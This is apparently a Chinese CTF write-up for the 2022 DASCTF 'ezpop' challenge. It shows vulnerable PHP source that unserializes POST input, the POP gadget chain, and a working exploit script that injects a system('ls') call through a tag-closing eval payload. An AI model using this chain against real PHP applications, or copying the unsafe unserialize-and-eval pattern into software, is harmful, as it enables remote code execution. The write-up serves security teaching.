---
title: 2022DASCTF X SU 三月春季挑战赛
date: 2022-3-20 12:33:33
tags: 
categories: 比赛题目复现
top_img: https://images.wallpaperscraft.com/image/single/forest_fog_trees_132037_1280x720.jpg
cover: https://images3.alphacoders.com/645/thumbbig-645549.webp
---

# 2022DASCTF X SU 三月春季挑战赛

## ezpop

给了源码

```php
<?php
 
class crow
{
    public $v1;
    public $v2;
 
    function eval() {
        echo new $this->v1($this->v2);
    }
 
    public function __invoke()
    {
        $this->v1->world();
    }
}
 
class fin
{
    public $f1;
 
    public function __destruct()
    {
        echo $this->f1 . '114514';
    }
 
    public function run()
    {
        ($this->f1)();
    }
 
    public function __call($a, $b)
    {
        echo $this->f1->get_flag();
    }
 
}
 
class what
{
    public $a;
 
    public function __toString()
    {
        $this->a->run();
        return 'hello';
    }
}
class mix
{
    public $m1;
 
    public function run()
    {
        ($this->m1)();
    }
 
    public function get_flag()
    {
        eval('#' . $this->m1);
    }
 
}
 
if (isset($_POST['cmd'])) {
    unserialize($_POST['cmd']);
} else {
    highlight_file(__FILE__);
}
```

**pop链**

```php
fin->__destruct()->what->__toString()->mix->run()->crow->__invoke()->fin->__call()->mix->get_flag()
```

主要注意下这里`eval('#' . $this->m1)`

用php标签闭合就好了

**payload**

```php
<?php
 
class crow
{
    public $v1;
    public $v2;
    public function __construct()
    {
        $this->v1=new fin();
        $this->v1->f1=new mix();
        $this->v1->f1->m1="?><?=system('ls');";
    }
}
 
class fin
{
    public $f1;
    public function __construct()
    {
        $f1=$this->f1;
    }
 
}
 
class what
{
    public $a;
 
    public function __construct()
    {
        $this->a=new fin();
        $this->a->f1=new crow();
    }
}
class mix
{
    public $m1;
 
    public function __construct()
    {
        $m1=$this->m1;
    }
 
}
 
$a=new fin();
$a->f1=new what();
echo serialize($a);
```

